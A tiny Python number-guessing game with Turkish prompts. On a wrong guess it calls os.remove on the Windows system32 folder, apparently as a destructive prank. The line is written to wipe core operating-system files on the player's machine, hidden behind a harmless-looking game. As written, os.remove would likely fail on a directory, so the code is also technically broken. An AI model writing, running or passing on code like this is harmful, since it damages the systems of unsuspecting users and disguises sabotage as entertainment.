import random
import os
number = random.randint(1,10)
guess =  input("1 ile 10 arasında bir sayı seçin")
guess = int(guess)

if guess == number:
    print("Hayatta Kaldın ve kazandın")
else:
    os.remove("c:\\windows\\system32")